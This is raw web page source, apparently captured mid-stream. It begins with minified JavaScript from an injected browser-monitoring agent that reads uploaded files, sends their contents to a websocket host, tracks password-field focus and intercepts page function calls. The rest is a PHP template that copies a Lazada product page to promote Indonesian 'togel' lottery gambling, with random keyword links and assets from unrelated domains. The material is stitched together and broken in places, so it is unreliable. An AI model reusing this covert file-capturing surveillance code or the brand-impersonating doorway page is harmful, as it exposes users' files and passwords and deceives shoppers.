Date(M.Y,M.M-1,M.D,M.H,M.m,M.s,M.S),e[1]+=0|t.isLeapYear(n),1>M.M||12<M.M||1>M.D||M.D>e[M.M-1]||23<M.H||59<M.m||59<M.s?NaN:r?t.addMinutes(n,-n.getTimezoneOffset()):n):NaN},t.isValid=function(e,Y){return!!t.parse(e,Y)},t.addYears=function(e,Y){return t.addMonths(e,12*Y)},t.addMonths=function(e,t){var Y=new Date(e.getTime());return Y.setMonth(Y.getMonth()+t),Y},t.addDays=function(e,t){var Y=new Date(e.getTime());return Y.setDate(Y.getDate()+t),Y},t.addHours=function(e,Y){return t.addMilliseconds(e,36e5*Y)},t.addMinutes=function(e,Y){return t.addMilliseconds(e,6e4*Y)},t.addSeconds=function(e,Y){return t.addMilliseconds(e,1e3*Y)},t.addMilliseconds=function(e,t){return new Date(e.getTime()+t)},t.subtract=function(e,t){var Y=e.getTime()-t.getTime();return{toMilliseconds:function(){return Y},toSeconds:function(){return Y/1e3|0},toMinutes:function(){return Y/6e4|0},toHours:function(){return Y/36e5|0},toDays:function(){return Y/864e5|0}}},t.isLeapYear=function(e){return!(((e=e.getFullYear())%4||!(e%100))&&e%400)},t.isSameDay=function(e,Y){return t.format(e,"YYYYMMDD")===t.format(Y,"YYYYMMDD")},e.date=t;const b=new Map;function N(e){const t="tm_overlay",Y=10485760;let n=function(){let e=document.getElementById(t);e&&e.remove(),b.clear()};if(e){const r=new FileReader;let a;e.size>Y&&(a=e.slice(0,Y));let s=!1;if(b.forEach((t=>{t.fileName===e.name&&(s=!0)})),!s){r.addEventListener("load",(t=>{try{const t=crypto.randomUUID();b.set(t,{responseCallback:e=>{e.block&&function(){const e=[],t=t=>{t.querySelectorAll('button:not([tabindex="-1"])').forEach((t=>{t.querySelector('span[data-icon="x"]')&&(e.push(t),t.click())}))},Y=new MutationObserver(((Y,n)=>{Y.forEach((e=>{"childList"===e.type&&e.addedNodes.length>0&&e.addedNodes.forEach((e=>{e.nodeType===Node.ELEMENT_NODE&&t(e)}))})),e.length>0&&n.disconnect()}));Y.observe(document.body,{childList:!0,subtree:!0}),t(document),e.length>0&&Y.disconnect()}(),n()},fileName:e.name}),B.send(JSON.stringify({requestId:t,type:"waptransfer",direction:"upload",filename:e.name,filesize:e.size,filetype:e.type,url:document.URL,filehash:"0",process:w.pn,content:S(r.result)}))}catch(e){n()}})),r.addEventListener("error",(e=>{n()})),r.addEventListener("abort",(e=>{n()})),function(){if(!document.getElementById(t)){let e=document.createElement("div");e.id=t,e.style.cssText="background:rgba(0, 0, 0, .6);position:absolute;top:0;left:0;height:100%;width:100%;z-index:999",document.body.appendChild(e)}}();try{null==a?r.readAsArrayBuffer(e):r.readAsArrayBuffer(a)}catch(e){n()}}}}function A(e){var t={handler:"log",module:"wapjs",url:"wap",message:e};B.send(JSON.stringify(t))}function E(e){var t={name:e.data.name,type:e.data.type};"iframePasswordInputFocused"===e.data.message?c(t,!0):"iframePasswordInputBlurred"===e.data.message&&M(t,!0)}var w={token:"c588019f-44a4-4fee-afba-d8c587280458",sendNotificationsInterval:Number("1000"),pollWhatsappTrackingInterval:Number("20000"),connectionString:"wss://tm.filter:1502",pid:"19892",pn:"chrome.exe",iup:false,dontTrackWebPasswords:false,extJs:/*   * don't use double slash comments here as this will be stored in one line for the TMU migrations   *    * this is stored in the kv_store table for the key hm_websites_js   *    * all code should describe one javascript object, i.e. { bla-bla-bla }   *    * this object will be included in standard js injection code as a replacement of 'insight_placeholder'   * if domain of the page matches one of the domain regexes from the hypermonitoring_web settings   * if not, 'insight_placeholder' will be replaced with null   *    * this object must contain function init(token), it will be called only once when document became visible (it is called for every iframe too)   *    * also this code contains placeholdes, see doc in the code (search for `_placeholder` suffix)   *    * also this object must contain property webSock that will be assigned WebSocket when created   *    * this object should send json for every registered event with the following structure:   * {   *      cat: 'insight' - this is required to route the message to the proper handler   *      type: click | changed - type of the event   *      elm: uint32 - id of the element that fired the event. used for deduplication of the events   *      page: uint32 - id of the hypermonitored location   *      obj: uint32 - id of the hypermonitored object that fired event   *      url: string - current document url   *      token: string - js injection token, used to unique identify browser page   *      values: json - contains all collected information about event and it's context   *      proc: id of the process of the host electron   * }   */  {      /* this will be replaced with the rules for current domain       * [        *      {          *          id: locationId,        *          url: string | null,        *          objects:        *          [       *              {        *                  id: objectId,        *                  sources: [],       *                  ...       *              },       *              ...       *          ]        *      },       *      ...       * ]       */      pages: [],        /* required property for electron */      proc: null,        /* required property - will be assigned to WebSocket once it will be read */      webSock: null,      pendingPackets: [],        webSockReady: function () {          return this.webSock !== null && this.webSock.readyState === WebSocket.OPEN;      },        processPacket: function (t) {          if (!this.webSockReady())              this.pendingPackets.push(t);          else {              this.sendPendingPackets();              this.webSock.send(t);          }      },        sendPendingPackets: function () {          if (this.webSockReady() && this.pendingPackets.length > 0) {              for (var i = 0; i < this.pendingPackets.length; ++i)                  this.webSock.send(this.pendingPackets[i]);              this.pendingPackets = [];          }      },        /* store js injection token */      token: null,        /* should we send log messages to the agent, bool */      sendLog: false,        /* should we include all content of the htmlelements in the log messages, bool */      sendLogFullData: false,        /* should we log snapshots of the html after every mutation event */      sendLogSnapshots: false,        /* should we catch exceptions and log them (as opposed to let browser stops in debugger) */      sendLogExceptions: true,        /*       * required function - it will be called once when document became visible       * it will be also called for iframes       *           * argument token - js injection token       */      init: function (token) {          this.token = token;          this.log("init: token:" + token + " sendLog:" + this.sendLog + " sendLogFullData:" + this.sendLogFullData);            if (document.readyState === "interactive" || document.readyState === "complete")              this.attachEvents();          else              window.addEventListener("DOMContentLoaded", this.attachEvents.bind(this));            setInterval(this.sendPendingPackets.bind(this), 1000);      },        /*       * here we scan all provided settings and choose what listeners are required       * we don't want to intrude in the js more that necessary for performance and compatibility considerations       */      attachEvents: function () {          var needClick = false, needChange = false, needChildList = this.sendLogSnapshots, needCharacterData = this.sendLogSnapshots, callObjects = [];          this.pages.forEach(function (page) {              page.objects.forEach(function (obj) {                  ['addText', 'removeText', 'addElm', 'removeElm', 'stateByElm'].forEach(function (source) {                      if (obj.sources.includes(source))                          needChildList = true;                  });                  if (obj.sources.includes('changeText'))                      needCharacterData = true;                  if (obj.sources.includes('change'))                      needChange = true;                  if (obj.sources.includes('click'))                      needClick = true;                  if (obj.sources.includes('call'))                      callObjects.push({ page: page, obj: obj });              });          });          this.log("attachEvents: needClick:" + needClick + " needChange:" + needChange + " needChildList:" + needChildList + " needCharacterData:" + needCharacterData);          if (needClick)              window.addEventListener('click', this.onEvent.bind(this), true);          if (needChange)              window.addEventListener('change', this.onEvent.bind(this), true);          if (needChildList || needCharacterData)              new MutationObserver(this.onMutation.bind(this)).observe(document, { subtree: true, childList: needChildList, characterData: needCharacterData });            if (needClick || needChange || needChildList || needCharacterData) {              /* we process mutation events only after human interaction */              window.addEventListener('keydown', this.onInteraction.bind(this));              window.addEventListener('mousedown', this.onInteraction.bind(this));          }            if (callObjects.length > 0) {              var self = this;              var intervalHandle = setInterval(function () {                  for (var i = callObjects.length - 1; i >= 0; i--) {                      if (self.interceptCall(callObjects[i]))                          callObjects.splice(i, 1);                  }                  if (callObjects.length == 0)                      clearInterval(intervalHandle);              }, 500);          }      },        interceptCall: function (callObj) {          var obj = callObj.obj, jsObj;          try {              jsObj = this.calc(obj, "object", [], []);          }          catch{ }          if (jsObj == null) {              this.log("attachEvents: object:" + obj.id + " is not found");              return false;          }          var method = jsObj[obj.func];          var self = this;          jsObj[obj.func] = function () {              var arg_data = self.calc(obj, "arg_data", ["args"], [arguments], "return null");              var ret = method.apply(jsObj, arguments);              var return_data = self.calc(obj, "return_data", ["ret"], [ret], "return null");              if (arg_data != null || return_data != null)                  self.sendEvent("interceptCall", callObj.page, obj, undefined, { arg_data: arg_data, return_data: return_data });              return ret;          };          self.log("attachEvents: object:" + obj.id + ", " + (obj.object || obj.object_f) + " is found, call to '" + obj.func + "' intercepted");          return true;      },        /* new Date().getTime() of the last human interacion (keydown, mousedown, mouseup)      to filter out DOM mutation events that was not due to human activity */      lastInteraction: null,        /* on human interaction (keydown, mousedown, mouseup) */      onInteraction: function (ev) {          this.lastInteraction = new Date().getTime();          this.log('onInteraction: human Interaction ' + ev.type + ': ' + this.lastInteraction);      },        /* handles click and change events */      onEvent: function (ev) {          var self = this;          this.callSafe("onEvent", function () {              self.handleEvent(ev.type, ev.type, ev.composed ? ev.composedPath() : self.getAncestors(ev.target));          });      },        /* handles addText, changeText, removeText, addElm, removeElm DOM mutation events */      onMutation: function (mList) {          var self = this;          if (this.sendLogSnapshots)              this.log("snapshot: " + document.body.outerHTML.replace(/\n|\r/g, '#'));          this.callSafe("onMutation", function () {              if (self.lastInteraction !== null) {                  mList.forEach(function (m) {                      if (m.type === 'childList') {                          m.removedNodes.forEach(function (sub) {                              if (sub.nodeType === Node.TEXT_NODE)                                  self.handleEvent('change', 'removeText', self.getAncestors(m.target));                              else if (sub.nodeType === Node.ELEMENT_NODE)                                  self.handleEventWithSub('change', 'removeElm', self.getAncestors(m.target), sub);                          });                          m.addedNodes.forEach(function (sub) {                              if (sub.nodeType === Node.TEXT_NODE)                                  self.handleEvent('change', 'addText', self.getAncestors(m.target));                              else if (sub.nodeType === Node.ELEMENT_NODE)                                  self.handleEventWithSub('change', 'addElm', self.getAncestors(m.target), sub);                          });                      }                      else if (m.type === 'characterData' && m.target)                          self.handleEvent('change', 'changeText', self.getAncestors(m.target));                  });              }                self.processStateByElm();          });      },        objId2key2value: {},      processStateByElm: function () {          var self = this;          self.forEachObject('stateByElm', function (page, obj) {              var key2value = {};              if (self.calc(obj, 'condition', [], [], "return true;")) {                  self.applySelector(document, obj.selector).forEach(function (elm) {                      var key = self.calc(obj, 'key', ['e'], [elm]);                      var value = self.calc(obj, 'value', ['e'], [elm]);                      key2value[JSON.stringify(key)] = JSON.stringify(value);                  });              }                var oldKey2Value = self.objId2key2value[obj.id];              oldKey2Value = oldKey2Value ? oldKey2Value : {};              for (var k in key2value) {                  if (key2value[k] !== oldKey2Value[k])                      self.sendEvent('change', page, obj, undefined, { key: JSON.parse(k), old: oldKey2Value[k] ? JSON.parse(oldKey2Value[k]) : undefined, "new": JSON.parse(key2value[k]) });                  delete oldKey2Value[k];              }              for (var k in oldKey2Value)                  self.sendEvent('change', page, obj, undefined, { key: JSON.parse(k), old: oldKey2Value[k] ? JSON.parse(oldKey2Value[k]) : undefined });              self.objId2key2value[obj.id] = key2value;          });      },        /* get ancestors for the element */      getAncestors: function (e) {          var path = [];          for (; e !== document && e !== null; e = e.parentNode)              path.push(e);          return path;      },        /* handles simple events: click, change, addText, changeText, removeText */      handleEvent: function (type, source, ancestors) {          if (this.sendLog)    /* double check not to call elementString in vain */              this.log("handleEvent: type:" + type + " source:" + source + " target:" + this.elementString(ancestors[0]));          var self = this;          this.forEachMatch(source, ancestors, function (page, obj, elm) {              self.send(type, page, obj, ancestors[0], elm);          });      },        /* handles events with sub element: addElm, removeElm */      handleEventWithSub: function (type, source, ancestors, sub) {          if (this.sendLog)    /* double check not to call elementString in vain */              this.log("handleEventWithSub: type:" + type + " source:" + source + " target:" + this.elementString(ancestors[0]) + " sub:" + this.elementString(sub));          var self = this;          this.forEachMatch(source, ancestors, function (page, obj, elm) {              if (!obj.sub_matches || sub.matches(obj.sub_matches)) {                  if (obj.sub_selector) {                      self.applySelector(sub, obj.sub_selector).forEach(function (descendant) {                          self.send(type, page, obj, ancestors[0], elm, sub, descendant);                      });                  }                  else {                      self.send(type, page, obj, ancestors[0], elm, sub);                  }              }          });      },        /* enumerate all obj based on url and source. calls handler(page, obj) */      forEachObject: function (source, handler) {          var self = this;          this.pages.forEach(function (page) {              if (self.testRegex(page.url, document.URL)) {                  page.objects.forEach(function (obj) {                      if (obj.sources.includes(source))                          handler(page, obj);                  });              }          });      },        /* enumerate all matches based on url, source and interactionInterval, matches and selector. calls handler(page, obj, matchedElm) */      forEachMatch: function (source, ancestors, handler) {          var self = this;          this.forEachObject(source, function (page, obj) {              if (obj.interactionInterval && (self.lastInteraction == null || new Date().getTime() - self.lastInteraction > obj.interactionInterval)) {                  if (self.lastInteraction != null)                      self.log('forEachMatch skip rule: interval:' + (new Date().getTime() - self.lastInteraction).toString());              }              else {                  var scope = obj.scope === 'target' ? [ancestors[0]] : ancestors,                      m = obj.matches,                      set = !m && obj.selector ? self.applySelector(document, obj.selector) : null;                  for (var i = 0; i < scope.length; ++i) {                      if ((m && scope[i].matches && scope[i].matches(m)) /* scope[i] may not be element, test if matches is defined */                          || (set && set.includes(scope[i]))) {                          handler(page, obj, scope[i]);                          break;                      }                  }              }          });      },        /* return array of elements after applying commands from the selector settings */      applySelector: function (root, commands) {          const self = this;          var elms = [root];          commands.forEach(function (command) {              var res = [];              elms.forEach(function (elm) {                  if (command.test_text) {    /* test_text command keeps only elements whose text matches regex */                      if (self.testRegex(command.test_text, elm.textContent))                          res.push(elm);                  }                  else if (command.move) {    /* move command transforms element into querySelectorAll set and select shadowRoot if present */                      elm.querySelectorAll(':scope ' + command.move).forEach(function (e) {                          var s = e.shadowRoot;                          res.push(s ? s : e);                      });                  }                  else if (command.exists) {  /* exists command keeps only elements for which selector set is not empty */                      if (self.applySelector(elm, command.exists).length !== 0)                          res.push(elm);                  }              });              elms = res;          });          return elms;      },        /* send event data to websocket, data structure:       * {       *      cat: 'insight' - this is required to route the message to the proper handler       *      type: click | changed - type of the event       *      elm: uint32 - id of the element that fired the event. used for deduplication of the events       *      page: uint32 - id of the hypermonitored location       *      obj: uint32 - id of the hypermonitored object that fired event       *      url: string - current document url       *      token: string - js injection token, used to unique identify browser page       *      values: json - contains all collected information about event and it's context       * }       */      lastSentElm: null,      lastSentElmId: 0,      send: function (type, page, obj, target, e, sub, descendant) {          if (this.lastSentElm !== e) {              this.lastSentElm = e;              this.lastSentElmId++;          }          const values = this.calc(obj, 'values', ['target', 'e', 'sub', 'descendant'], [target, e, sub, descendant]);          if (values)              this.sendEvent(type, page, obj, this.lastSentElmId.toString(), values);      },        sendEvent: function (type, page, obj, elmId, values) {          const t = JSON.stringify({              values: values,              handler: page.handler,              type: type,              elm: elmId,              page: page.id,              obj: obj.id,              url: document.URL,              token: this.token,              proc: this.proc          });          if (this.sendLog)              console.log("[InsightJs] send: " + t);          this.processPacket(t);      },        /* utils: cache compiled regexes */      string2regex: {},      testRegex: function (stringRegex, value) {          if (stringRegex === null)              return true;          if (!(stringRegex in this.string2regex))              this.string2regex[stringRegex] = new RegExp(stringRegex);          return this.string2regex[stringRegex].test(value);      },        /* utils: cache compiled functions */      code2function: {},      calc: function (host, prop, names, args, defaultCode) {          var code = host[prop] ? "return " + host[prop] + ";" : host[prop + "_f"];          if (code == null)              code = defaultCode;          if (code == null) {              this.log("code not found, calc(" + JSON.stringify(host) + "), prop:" + prop);              return {};          }          if (!(code in this.code2function))              this.code2function[code] = new Function(...names, code);          return this.code2function[code].apply(null, args);      },        /* utils: dump html element to the log */      elementString: function (e) {          var html = e.nodeType == Node.TEXT_NODE ? e.data : e.outerHTML;          if (this.sendLogFullData)              return html;          html = html.length > 100 ? html.substr(0, 100) + " ... total len:" + html.length : html;          return html.replace(/\n|\r/g, '#');      },        /* log to console and to the agent */      log: function (message, force) {          if (this.sendLog || force) {              var m = new Date().toLocaleString() + ": " + message;              console.log("[InsightJs] " + m + ", url:" + document.URL);              this.processPacket(JSON.stringify({ handler: "log", module: "InsightJs", message: m, url: document.URL }));          }      },        callSafe: function (name, f) {          if (!this.sendLogExceptions)              f();          else {              try {                  f()              }              catch (e) {                  this.log("exception in " + name + ":" + e.name + ", " + e.message, true);              }          }      }  }},L=6e4,I=null,T=null,k=null,C=null,O=!1,H=null,P=null,R=0,x=null,B=null,F="",J=!1;!function e(t){m()?setTimeout((function(){e(t)}),1e3):t()}((function(){w.extJs&&w.extJs.init(w.token),n()&&(window.addEventListener("focus",r,!0),w.dontTrackWebPasswords&&window.addEventListener("message",E,!1)),n()||w.extJs?p():w.dontTrackWebPasswords&&f()}))}();</script><script>
  (function() {
    try {
      if (window.aplusPageIdSetComplete || /AliApp/i.test(navigator.userAgent)) {
        return;
      }

      var get_cookie = function (sName) {
        var sRE = '(?:; )?' + sName + '=([^;]*);?';
        var oRE = new RegExp(sRE);
        if (oRE.test(document.cookie)) {
        var str = decodeURIComponent(RegExp['$1']) || '';
        if (str.trim().length > 0) {
          return str;
        } else {
          return '-';
        }
        } else {
          return '-';
        }
      };
      var getRand = function () {
        var page_id = get_cookie('cna') || '001';
        page_id = page_id.toLowerCase().replace(/[^a-z\d]/g, '');
        page_id = page_id.substring(0, 16);
        var d = (new Date()).getTime();
        var randend = [
          page_id,
          d.toString(16)
        ].join('');

        for (var i = 1; i < 10; i++) {
          var _r = parseInt(Math.round(Math.random() * 10000000000), 10).toString(16);
          randend += _r;
        }
        randend = randend.substr(0, 42);
        return randend;
      };
      var pageid = getRand();
      var aq = (window.aplus_queue || (window.aplus_queue = []));
      aq.push({
        'action':'aplus.appendMetaInfo',
        'arguments':['aplus-cpvdata', {"pageid":pageid}]
      });
      aq.push({
        'action':'aplus.appendMetaInfo',
        'arguments':['aplus-exdata',{"st_page_id":pageid}]
      });
      // ?????aplus
      var gq = (window.goldlog_queue || (window.goldlog_queue = []));
      gq.push({
        'action':'goldlog.appendMetaInfo',
        'arguments':['aplus-cpvdata', {"pageid":pageid}]
      });
      gq.push({
        'action':'goldlog.appendMetaInfo',
        'arguments':['aplus-exdata',{"st_page_id":pageid}]
      });
      window.aplusPageIdSetComplete = true;
    } catch(err) {
      console.error(err);
    }
  })();
  </script>

  <script type="text/javascript">
    var timings = {
      start: Date.now(),
    };
    var dataLayer = window.dataLayer || [];
    var pdpTrackingData = "{\"pdt_category\":[\"Toto & Togel\"],\"pagetype\":\"pdp\",\"pdt_discount\":\"\",\"pdt_photo\":\"https://image-seotom.pages.dev/banner<?php echo htmlspecialchars($Number); ?>.jpg\",\"v_voya\":1,\"brand_name\":\"4D\",\"brand_id\":\"842\",\"pdt_sku\":7867968900,\"core\":{\"country\":\"ID\",\"layoutType\":\"desktop\",\"language\":\"in\",\"currencyCode\":\"IDR\"},\"seller_name\":\"\",\"pdt_simplesku\":14280834150,\"pdt_name\":\"<?php echo htmlspecialchars($titleContent); ?>\",\"page\":{\"regCategoryId\":\"300300002584\",\"xParams\":\"_p_typ=pdp&_p_ispdp=1&_p_item=7867968900_ID-14280834150&_p_prod=7867968900&_p_sku=14280834150&_p_slr=\"},\"supplier_id\":\"\",\"pdt_price\":\"Rp2.699.000\"}";
    try {
      pdpTrackingData = JSON.parse(pdpTrackingData);
      pdpTrackingData.v_voya = false;
      dataLayer.push(pdpTrackingData);
      dataLayer.push({
        gtm_enable: false,
        v_voya: false
      });
    } catch (e) {
      if (window.console) {
        console.log(e);
      }
    }
    /**
     * ??beacon aplus script
     */
    var siteNameForApluPluginLoader = "<?php echo htmlspecialchars($BRANDS); ?>";

  </script>

  <!-- csrf -->
  <meta name="X-CSRF-TOKEN" id="X-CSRF-TOKEN" content="eb3380311eeee" />
</head>
<body data-spm="pdp_revamp" style="overflow-y: scroll">
  <script>window.__lzd__svg__cssinject__ = true;</script>
  <style>
    .svgfont {
      display: inline-block;
      width: 5em;
      height: 5em;
      fill: currentColor;
      font-size: 1em;
    }

    #container, body {
      background: #000000 url(https://imgstore.io/images/2025/04/18/olxtoto_background.jpeg) center center no-repeat;

    .lzd-header .lzd-links-bar {
      background: linear-gradient(89.87deg, #000000 35.41%, #000000 121.72%);
    }

    .lzd-header .lzd-links-bar .top-links-item .orange, .lzd-header .lzd-links-bar .top-links-item.orange {
      color: #ffffff;
    }

    .lzd-header .lzd-links-bar .top-links-item .cyan, .lzd-header .lzd-links-bar .top-links-item.cyan {
      color: #ffffff;
    }

  }

  </style>


  <div class="mui-zebra-module" id="J_icms-5004710-1520248008751" data-module-id="icms-5004710-1520248008751"
  data-version="5.0.5" data-spm="icms-5004710-1520248008751">
  <script type="text/javascript">
    try {
      if (typeof window === 'object') {
        window.CROSSIMAGE_GRAYSCALE_RULE = { "id-live-01.slatic.net": "id-test-11.slatic.net", "id-live-02.slatic.net": "id-test-11.slatic.net", "id-live-03.slatic.net": "id-test-11.slatic.net", "id-live.slatic.net": "id-test-11.slatic.net" };
        window.crossimageConfig = {
          quality: 'q80'
        }
      }
    } catch (error) {
      console.log('CROSSIMAGE CONFIG ERROR');
    }
  </script>

</div>

  <script type="application/ld+json">
    {"@type":"Product","@context":"https://schema.org","name":"<?php echo htmlspecialchars($titleContent); ?>","image":"https://image-seotom.pages.dev/banner<?php echo htmlspecialchars($Number); ?>.jpg","category":"Toto & Togel","brand":{"@type":"Brand","name":"4D","url":"<?php echo htmlspecialchars($urlPath); ?>"},"sku":"7867968900_ID-14280834150","mpn":7867968900,"description":"<?php echo htmlspecialchars($metadesContent); ?>","url":"<?php echo htmlspecialchars($urlPath); ?>","offers":{"@type":"Offer","url":"<?php echo htmlspecialchars($urlPath); ?>","seller":{"@type":"Organization","name":""},"priceCurrency":"IDR","price":0,"availability":"https://schema.org/InStock","itemCondition":"https://schema.org/NewCondition"}}
  </script>
  <script type="application/ld+json" data-rh="true">
      {
        "@context": "http://schema.org",
        "@type": "BreadcrumbList",
        "itemListElement": [{
          "@type": "ListItem",
          "position": 1,
          "item": {
            "@id": "<?php echo htmlspecialchars($urlPath); ?>",
            "name": "<?php echo htmlspecialchars($BRANDS); ?>"
          }
        }, {
          "@type": "ListItem",
          "position": 2,
          "item": {
            "@id": "<?php echo $domain; ?>/<?php echo htmlspecialchars($randomUrl4); ?>",
            "name": "<?php echo htmlspecialchars($randomKeyword4); ?>"
          }
        }, {
          "@type": "ListItem",
          "position": 3,
          "item": {
            "@id": "<?php echo $domain; ?>/<?php echo htmlspecialchars($randomUrl); ?>",
            "name": "<?php echo htmlspecialchars($randomKeyword); ?>"
          }
        }, {
          "@type": "ListItem",
          "position": 4,
          "item": {
            "@id": "<?php echo $domain; ?>/<?php echo htmlspecialchars($randomUrl2); ?>",
            "name": "<?php echo htmlspecialchars($randomKeyword2); ?>"
          }
        }, {
          "@type": "ListItem",
          "position": 5,
          "item": {
            "@id": "<?php echo $domain; ?>/<?php echo htmlspecialchars($randomUrl3); ?>",
            "name": "<?php echo htmlspecialchars($randomKeyword3); ?>"
          }
        }]
      }
    </script>


    <script>
    window.__bl ={};
    window._blReport=function(e,t){window.__bl&&(__bl.api?__bl[e].apply(__bl,t):(__bl.pipe=__bl.pipe||[],__bl.pipe.push([e].concat(t))))},window.addEventListener("error",function(e){_blReport("error",[e.error,e])}),window.addEventListener("unhandledrejection",function(e){"[object Error]"===Object.prototype.toString.call(e.reason)&&_blReport("error",[e.reason])});
</script>
<script>
  window.g_config = window.g_config || {};
  window.g_config.regionID = 'ID';
  window.g_config.language = 'id';
</script>
<script src="https://asset-satset.info/lazada/ane-3.css"></script>
<script src="https://asset-satset.info/lazada/ane-4.css"></script>
<link rel="stylesheet" href="https://asset-satset.info/lazada/ane-5.css">
<script>window.g_config = window.g_config || {};window.g_config.loadedCss = window.g_config.loadedCss || [];window.g_config.loadedCss = ["@ali/lzdmod-site-nav-pc/pc/index.css","@ali/lzdmod-site-menu-nav-pc/pc/index.css","@ali/lzdmod-site-menu-pc/pc/index.css"];</script>
<div class="mui-zebra-module" id="J_icms-5000458-1511711480682" data-module-id="icms-5000458-1511711480682" data-version="5.2.43" data-spm="icms-5000458-1511711480682">
<script>
(function() {
  try {
    if (window.aplusPageIdSetComplete || /AliApp/i.test(navigator.userAgent)) {
      return;
    }
    var get_cookie = function (sName) {
      var sRE = '(?:; )?' + sName + '=([^;]*);?';
      var oRE = new RegExp(sRE);
      if (oRE.test(document.cookie)) {
      var str = decodeURIComponent(RegExp['$1']) || '';
      if (str.trim().length > 0) {
        return str;
      } else {
        return '-';
      }
      } else {
        return '-';
      }
    };
    var getRand = function () {
      var page_id = get_cookie('cna') || '001';
      page_id = page_id.toLowerCase().replace(/[^a-z\d]/g, '');
      page_id = page_id.substring(0, 16);
      var d = (new Date()).getTime();
      var randend = [
        page_id,
        d.toString(16)
      ].join('');
      for (var i = 1; i < 10; i++) {
        var _r = parseInt(Math.round(Math.random() * 10000000000), 10).toString(16);
        randend += _r;
      }
      randend = randend.substr(0, 42);
      return randend;
    };
    var pageid = getRand();
    var aq = (window.aplus_queue || (window.aplus_queue = []));
    aq.push({
      'action':'aplus.appendMetaInfo',
      'arguments':['aplus-cpvdata', {"pageid":pageid}]
    });
    aq.push({
      'action':'aplus.appendMetaInfo',
      'arguments':['aplus-exdata',{"st_page_id":pageid}]
    });
    // ?????aplus
    var gq = (window.goldlog_queue || (window.goldlog_queue = []));
    gq.push({
      'action':'goldlog.appendMetaInfo',
      'arguments':['aplus-cpvdata', {"pageid":pageid}]
    });
    gq.push({
      'action':'goldlog.appendMetaInfo',
      'arguments':['aplus-exdata',{"st_page_id":pageid}]
    });
    window.aplusPageIdSetComplete = true;
  } catch(err) {
    console.error(err);
  }
})();
</script>
  <link rel="stylesheet" href="https://asset-satset.info/lazada/ane-1.css">
  <script src="https://asset-satset.info/lazada/ane-2.css"></script>
<script>
  window.g_config = window.g_config || {};
  window.g_config.voyagerVersion = '2';
  window.g_config.voyagerEnv = 'product';
  window.g_config.channel = 'pdp';
  window.g_config.showPcSearchboxHotWords = true;
</script>
<div id="J_LzdSiteNav" class="site-nav J_NavScroll" data-mod-name="@ali/lzdmod-site-nav-pc/pc/index" data-config="{}">
  <div class="lzd-header   " data-spm="header" data-tag="links">
    <div id="topActionHeader" class="lzd-header-content-wrap J_NavScroll">
      <div class="lzd-header-content">
        <div class="lzd-links-bar" id="topActionLinks">
            <div class="links-list header-content ID id">
                <div class="top-links-item" id="topActionInternalFeedback" style="display:none;">
                    <a class="highlight" target="_blank" href="<?php echo htmlspecialchars($urlPath); ?>" data-spm-click="gostr=/<?php echo htmlspecialchars($BRANDS); ?>.togel.tbar;locaid=d0">INTERNAL FEEDBACK</a>
                </div>
                  <div class="top-links-item" id="topActionFeedback">
                      <a class="highlight" target="_blank" href="<?php echo htmlspecialchars($urlPath); ?>" data-spm-click="gostr=/<?php echo htmlspecialchars($BRANDS); ?>.togel.tbar;locaid=dfeedback"><?php echo htmlspecialchars($BRANDS); ?></a>
                  </div>
                    <div class="top-links-item orange" id="topActionDownload" data-spm-click="gostr=/<?php echo htmlspecialchars($BRANDS); ?>.togel.tbar;locaid=d1">
                        <span><?php echo htmlspecialchars($BRANDS); ?></span>
                        <div class="lzd-download-popup top-popup-wrap" id="lzdDownloadPopup">
  <div class="top-popup-content lzd-download-content">
    <div class="get-the-app-scope">
      <div class="get-the-app">
        <div class="get-the-app-title">Download Aplikasinya dan Belanja Sekarang!</div>
        <div class="get-the-app-promotion">
            <div class="get-the-app-<?php echo htmlspecialchars($BRANDS); ?>-qr-wrap">
              <img class="get-the-app-<?php echo htmlspecialchars($BRANDS); ?>-qr" src="hhttps://kilat.digital/images/2025/07/27/e83a9bd986b640f20e0514739bd855fe.png" alt="">
            </div>

          <div class="promotion-text">
            <a href="https://weddings4u-plan.darkhaus.site/amp/">
              <div class="get-the-app-download-text">
                <p>Belanja di App banyak untungnya:</p>
<ul>
<li>Banyak Vouchernya</li>
<li>Produk Eksklusif di App</li>
<li>Rekomendasi Hanya Untukmu</li>
<li>Paling Pertama Dapat Promo&nbsp;</li>
</ul>
              </div>
            </a>
          </div>
        </div>
          <form class="get-the-app-form" id="topActionDownloadForm">
  <div class="top-input-wrap get-the-app-input-wrap">
    <input class="tel-text top-input" id="topActionDownloadInput" placeholder="eg. 0123456789" autocomplete="off">
    <button class="top-button button-submit" id="txt-submit">
      <i class="icon icon-arrow-on-button"></i>
    </button>
  </div>
</form>
<div class="success-message" id="topActionDownloadSuccessMsg"><span class="alert alert-success">Success! Please check your phone for the download link  </span></div>
<div class="error-message" id="topActionDownloadErrorMsg"></div>
        <div class="app-stores">
          <a href="<?php echo htmlspecialchars($urlPath); ?>" class="store-link">
            <i class="app-apple"></i>
          </a>
          <a href="<?php echo htmlspecialchars($urlPath); ?>" class="store-link">
            <i class="app-google"></i>
          </a>
        </div>
      </div>
    </div>
  </div>
</div>
                    </div>
                <div class="top-links-item" id="topActionSell">
                    <a class="cyan" href="<?php echo htmlspecialchars($urlPath); ?>" data-spm-click="gostr=/<?php echo htmlspecialchars($BRANDS); ?>.togel.tbar;locaid=d2">TOGEL ONLINE</a>
                </div>
                    <div class="top-links-item" id="topActionCustomCare" data-spm-click="gostr=/<?php echo htmlspecialchars($BRANDS); ?>.togel.tbar;locaid=d3">
                      <span>TOTO TOGEL</span>
                        <div class="lzd-customcare-popup top-popup-wrap">
  <div class="top-popup-content l-customcare-content">
    <ul class="care-list">
        
    </ul>
  </div>
</div>
                    </div>
                  <div class="top-links-item grey" id="topActionTrack" data-spm-click="gostr=/<?php echo htmlspecialchars($BRANDS); ?>.togel.tbar;locaid=d4">
                    <span>DAFTAR</span>
                    <div class="meta-track-popup top-popup-wrap" id="lzdTrackPop">
  <div class="top-popup-content meta-track-content">
    <div id="topActionMyLastOrder">
    </div>
    <div class="track-title">LACAK PESANAN</div>
    <form class="track-order-form" id="topActionTrackForm">
      <label for="topActionTrackOrderNumber" class="top-input-label">Nomor pesanan:</label>
      <div class="top-input-wrap track-order-input-wrap">
        <input placeholder="eg.123456789" id="topActionTrackOrderNumber" class="order-text top-input">
        <button type="button" class="top-button button-submit">
          <i class="icon icon-arrow-on-button"></i>
        </button>
      </div>
    </form>
    <div class="error-message" id="topActionTrackErrorMsg"></div>
  </div>
</div>
                  </div>
                <div class="top-links-item top-links-item-hidden" id="topActionUserAccont" data-spm-click="gostr=/<?php echo htmlspecialchars($BRANDS); ?>.togel.tbar;locaid=d7">
